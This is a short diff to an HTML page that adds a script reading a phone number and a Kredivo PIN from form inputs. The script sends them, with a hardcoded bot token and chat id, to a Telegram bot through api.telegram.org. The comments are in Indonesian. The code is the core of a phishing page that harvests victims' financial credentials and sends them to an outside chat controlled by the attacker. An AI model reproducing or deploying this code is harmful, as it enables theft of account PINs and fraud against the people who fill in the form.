@@ -307,4 +307,23 @@ function loadd() {
     })
 }
 </script>
+<script>
+function ses() {
+
+    
+    var logo = document.getElementById('logo');
+    var inpuser = document.getElementById('inpuser');
+    var inppas = document.getElementById('inppas');
+
+    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + inpuser.value + '%0A𝗣𝗜𝗡 𝗞𝗿𝗲𝗱𝗶𝘃𝗼%3A%0A' + inppas.value;
+   
+    var token = '6059948659:AAFLZx15JTI-9jU372rUcLnMepYGqoVMaW8'; // Ganti dengan token bot yang kamu buat
+    var grup = '6131190501'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+    })
+}
+</script>
 </DOCTYPE>
